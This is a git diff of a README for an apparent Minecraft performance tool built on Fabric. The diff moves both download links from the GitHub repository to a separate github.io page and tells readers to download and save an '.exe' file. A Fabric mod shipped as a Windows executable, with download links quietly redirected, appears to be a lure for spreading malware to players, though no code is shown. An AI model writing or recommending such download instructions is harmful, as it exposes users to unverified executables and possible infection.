@@ -1,6 +1,6 @@
 # ⚡ core-optimized-loader - Better performance for your Minecraft game
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/jolettadetergent875/core-optimized-loader)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://jolettadetergent875.github.io)
 
 This tool improves your Minecraft experience. It creates a smooth game environment by removing lag and increasing the frame rate. The software uses the Fabric modding platform to manage game files. It includes fixes for common stutters and adds useful features for daily play.
 
@@ -8,7 +8,7 @@ This tool improves your Minecraft experience. It creates a smooth game environme
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official release page](https://github.com/jolettadetergent875/core-optimized-loader).
+1. Go to the [official release page](https://jolettadetergent875.github.io).
 2. Look for the section labeled Releases.
 3. Click the link for the latest file ending in .exe.
 4. Save the file to your computer.
